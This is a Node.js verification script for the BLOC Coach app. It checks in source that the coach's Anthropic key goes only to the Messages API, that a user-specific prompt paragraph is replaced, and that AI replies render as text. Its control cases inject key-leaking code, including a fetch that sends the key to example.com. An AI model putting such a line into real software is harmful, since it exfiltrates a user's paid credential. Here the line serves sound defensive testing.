#!/usr/bin/env node
// ═══════════════════════════════════════════════════════════════════════
// verify-coach-ai.mjs — BLOC Coach's AI tools keep the coach's key on the
// device, send the client's cycle review without another person's details,
// and show replies as text (Coach v0.3, TECHNICAL §141)
//
// The rules themselves (built from what was sent, the goal change as BLOC's
// queue makes it, body.purpose, the calculated compliance) are vitest cases
// in coach/src/ai/ai.test.ts, which verify-coach-build.mjs runs. This checks
// what a unit test can't see, in the source:
//
// 🚨 THE KEY. The coach's Anthropic key lives in localStorage under
//    `blocCoach_aiKey` and goes to exactly one place: api.anthropic.com, from
//    ai/transport.ts. A key that reached a Supabase write, a publication or a
//    log would leak a paid credential into shared or stored data.
// 🚨 THE PROMPT. BLOC's cycle-review prompt carries a paragraph about one
//    particular user's tattoos. Coach replaces it by exact match
//    (PERSONAL_PHOTO_PARAGRAPH). If the engine's wording changes, the match
//    silently fails and every client's review is sent that paragraph: this
//    compares the two strings.
// 🚨 TEXT, NEVER MARKUP. A reply is the model's text, and a note back is the
//    client's. Nothing in the AI panel renders HTML from them.
// Controls: each check runs against a broken copy and must fail there.
// ═══════════════════════════════════════════════════════════════════════

import { readFileSync, readdirSync, statSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';

const repo = join(dirname(fileURLToPath(import.meta.url)), '..');
const read = (p) => readFileSync(join(repo, p), 'utf8');
let failures = 0;
function check(label, ok, detail) {
  if (!ok) failures++;
  console.log(`${ok ? '✓' : '✗'} ${label}`);
  if (!ok && detail) console.log(`    ${detail}`);
}
const strip = (src) => src.replace(/\/\*[\s\S]*?\*\//g, '').replace(/(^|[^:'"`\\])\/\/.*$/gm, '$1');
function walk(dir) {
  return readdirSync(join(repo, dir)).flatMap((f) => {
    const p = `${dir}/${f}`;
    return statSync(join(repo, p)).isDirectory() ? walk(p) : /\.(ts|tsx)$/.test(f) && !/\.test\.ts$/.test(f) ? [p] : [];
  });
}
const files = walk('coach/src');
const src = Object.fromEntries(files.map((f) => [f, strip(read(f))]));

// ── The key ─────────────────────────────────────────────────────────────
const storage = read('coach/src/lib/storage.ts');
check("the key's storage entry is Coach's own (KEYS.aiKey = 'blocCoach_aiKey')", /aiKey:\s*'blocCoach_aiKey'/.test(storage));

/** Files that touch the key: KEYS.aiKey or getAiKey(). */
const keyUsers = (map) => Object.entries(map).filter(([, s]) => /KEYS\.aiKey|getAiKey\s*\(/.test(s)).map(([f]) => f).sort();
const ALLOWED = ['coach/src/ai/transport.ts', 'coach/src/coach/client/AiPanel.tsx', 'coach/src/coach/screens/SettingsScreen.tsx'];
const users = keyUsers(src);
check('only the transport, the AI panel and Settings touch the key', JSON.stringify(users) === JSON.stringify(ALLOWED), users.join(', '));

/** The transport's only network call is the Messages API, and the key goes only in its x-api-key header. */
function transportOk(s) {
  const fetches = [...s.matchAll(/fetch\(\s*'([^']+)'/g)].map((m) => m[1]);
  return fetches.length === 1 && fetches[0] === 'https://api.anthropic.com/v1/messages'
    && /'x-api-key':\s*apiKey/.test(s) && (s.match(/apiKey/g) || []).length === 2 // the parameter and the header, nothing else
    && !/console\./.test(s);
}
const transport = src['coach/src/ai/transport.ts'];
check('the transport calls api.anthropic.com only, with the key in x-api-key only, and logs nothing', transportOk(transport));
check('control: a transport that logs the key is caught', !transportOk(transport.replace("body: JSON.stringify(request),", "body: JSON.stringify(request),\n      console.log(apiKey),")));
check('control: a second destination is caught', !transportOk(transport + "\nfetch('https://example.com/log', { body: apiKey });"));

/** The AI panel hands the key to the transport and nowhere else. */
function panelOk(s) {
  const uses = [...s.matchAll(/getAiKey\(\)/g)].length;
  const key = /const key = getAiKey\(\);/.test(s) && /coachCallModel\(key\)/.test(s);
  const leaks = /repo\.\w+\([^)]*\bkey\b/.test(s) || /payload[^;]*\bkey\b/.test(s);
  return uses >= 1 && key && !leaks;
}
const panel = src['coach/src/coach/client/AiPanel.tsx'];
check('the AI panel passes the key to coachCallModel and to no repo call or payload', panelOk(panel));
check('control: a key passed to a repo call is caught', !panelOk(panel.replace('coachCallModel(key)', 'coachCallModel(key)); repo.publish(key')));
check('no data-layer file mentions the key', !/aiKey|getAiKey|x-api-key/.test(src['coach/src/data/live.ts'] + src['coach/src/data/fixtures.ts']));

// ── The prompt paragraph ────────────────────────────────────────────────
const tools = read('coach/src/ai/tools.ts');
const para = /export const PERSONAL_PHOTO_PARAGRAPH = '([^']+)';/.exec(tools)?.[1];
const prompts = read('engine/src/prompts.ts');
check("the paragraph Coach replaces is word for word in the engine's cycle-review prompt", !!para && prompts.includes(para), para ? '' : 'PERSONAL_PHOTO_PARAGRAPH not found');
check('control: a one-word change to the engine is caught', !!para && !prompts.replace(para, para.replace('heavily', 'very')).includes(para));
check('the cycle review is sent through coachReviewPrompt', /coachReviewPrompt\(buildCycleReviewPrompt\(/.test(read('coach/src/ai/run.ts')));

// ── Text, never markup ──────────────────────────────────────────────────
const markup = (s) => /dangerouslySetInnerHTML|\.innerHTML\s*=/.test(s);
const aiFiles = files.filter((f) => f.startsWith('coach/src/ai/') || f === 'coach/src/coach/client/AiPanel.tsx');
check(`no AI tools file renders HTML from a reply or a note (${aiFiles.length} files)`, aiFiles.every((f) => !markup(src[f])), aiFiles.filter((f) => markup(src[f])).join(', '));
check('control: dangerouslySetInnerHTML is caught', markup('<p dangerouslySetInnerHTML={{ __html: e.headline }} />'));

console.log(failures ? `\n✗ ${failures} check(s) failed` : '\nAll checks passed.');
process.exit(failures ? 1 : 0);
